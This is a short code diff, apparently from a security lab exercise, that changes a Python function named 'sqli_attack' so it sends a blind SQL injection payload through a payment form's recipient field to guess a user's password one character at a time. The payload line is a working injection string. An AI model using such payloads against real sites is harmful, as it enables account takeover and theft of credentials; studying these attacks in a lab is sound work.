@@ -21,7 +21,7 @@ def submit_pay_form(sess, recipient, amount):
     return response.status_code == codes.ok
 
 def sqli_attack(username):
-    strng = username + " LIKE %w"
+    strng = username + "' AND users.password LIKE 'w%' LIMIT 1 OFFSET 0--"
     sess = Session()
     assert(submit_login_form(sess, "attacker", "attacker"))
     assert(submit_pay_form(sess, strng, 10))
